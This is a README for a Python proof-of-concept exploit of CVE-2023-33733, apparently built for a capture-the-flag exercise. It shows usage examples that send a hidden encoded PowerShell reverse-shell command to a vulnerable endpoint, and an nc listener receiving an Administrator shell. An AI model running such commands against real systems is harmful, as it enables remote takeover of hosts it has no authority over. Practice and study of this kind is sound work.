# CVE-2023-33733-POC

# Disclamer
I did not, nor do I take credit for finding this vulnerability.  This is simply a script I built to more easily exploit this vulnerability for a CTF.
For the oiriginal information please reference: https://github.com/c53elyas/CVE-2023-33733


This script is simply intended to be a quick Python3 Script to exploit CVE-2023-33733.  You will need to provide the host, port, command, and a valid session cookie.


# Help Menu
```
kali@kali:~/Desktop$ python3 exp.py --help 
usage: foothold.py [-h] --host HOST --port PORT --cmd CMD --session SESSION

options:
  -h, --help            show this help message and exit
  --host HOST
  --port PORT, -p PORT
  --cmd CMD, -c CMD
  --username USERNAME, -u USERNAME
  --password PASSWORD, -ps PASSWORD
  --session SESSION, --cookie SESSION, -sc SESSION
                        Session cookie
```

# Usage
```
kali@kali:~/Desktop$ python3 exp.py --host "vuln.server" --port 80 --cmd "powershell -nop -w hidden -e <your revshell code here>" --username "<your username here>" --password "<your password here>"
[*] Logging in to http://vuln.server:80
Retreived session cookie: SESSION=...
[*] Extracting session token...
[*] Token extracted:  .abc.xyz
[*] Building Exploit...
[*] Exploit built
[*] Preparing request
[*] Sending request to http://vuln.server:80/leaveRequest
[*] Sending a reverse shell should cause request to hang
[*] Request sent
[*] Probable success. Status Code 504


kali@kali:~/Desktop$ python3 exp.py --host "vuln.server" --port 80 --cmd "powershell -nop -w hidden -e <your revshell code here>" --session "<your cookie here>"
[*] Building Exploit...
[*] Exploit built
[*] Preparing request
[*] Sending request to http://vuln.server:80/leaveRequest
[*] Sending a reverse shell should cause request to hang
[*] Request sent
[*] Probable success. Status Code 500


# Listener
kali@kali:~/Desktop$ nc -lnvp 9001
connect to [10.10.10.2] from (UNKNOWN) [10.10.10.1] 50246
whoami
Administrator
```
